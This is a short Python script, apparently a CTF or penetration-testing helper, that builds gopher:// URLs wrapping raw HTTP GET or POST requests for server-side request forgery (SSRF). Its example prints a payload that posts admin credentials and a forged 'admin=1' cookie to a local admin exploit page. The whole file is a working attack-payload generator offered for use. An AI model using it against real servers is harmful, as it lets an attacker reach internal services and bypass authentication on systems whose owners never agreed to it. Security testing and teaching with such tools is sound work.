from urllib import parse
import base64
import requests

def http_gopher(ip="127.0.0.1", port="80", method="get", path="/", data="", header={"":""}, content_type="application/x-www-form-urlencoded"):
    """
    :param ip: ssrf target ip
    :param port: ssrf target port
    :param method: get or post?
    :param path: /index.php or / or other(you know
    :param data: post body data or get params
    :param header: http header, such as {"Cookie": "admin=1"}
    :param content_type: post data type
    # application/x-www-form-urlencoded
    # multipart/form-data
    # application/json
    :return: gopher url, such as gopher://127.0.0.1:80/_POSTxxxxxxxxxxxxxxxx
    """

    if method == "post":
        data = parse.unquote(data)
        data_len = len(data)
        body_data = parse.quote(data)
        base_data = "_POST%20{4}%20HTTP/1.1%0d%0aHost:%20{0}%0d%0aContent-Length:%20{1}%0d%0a{5}Content-Type:%20{2}%0d%0aConnection:%20close%0d%0a%0d%0a{3}"
        header_data = ""
        for h in header:
            if h == "":
                continue
            h_name = parse.unquote(h)
            h_value = parse.unquote(header[h])
            header_data = header_data + h_name + ":%20" + h_value + "%0d%0a"
        tcp_data = base_data.format(ip + ":" + port, data_len, content_type, body_data, path, header_data)
        payload = "gopher://" + ip + ":" +  port + "/" + tcp_data

    else:
        data = parse.unquote(data)
        data = parse.quote(data)
        base_data = "_GET%20{0}%20HTTP/1.1%0d%0aHost:%20{1}%0d%0aContent-Length:%200%0d%0a{2}Connection:%20close%0d%0a%0d%0a"
        header_data = ""
        for h in header:
            if h == "":
                continue
            h_name = parse.unquote(h)
            h_value = parse.unquote(header[h])
            header_data = header_data + h_name + ":%20" + h_value + "%0d%0a"

        tcp_data = base_data.format( path, ip + ":" + port, header_data)
        payload = "gopher://" + ip + ":" + port + "/" + tcp_data

    return payload

if __name__ == "__main__":
    print(http_gopher("127.0.0.1", "80", "post", "/admin_exp.php", "uname=admin&passwd=admin", {"Cookie": "admin=1"}))
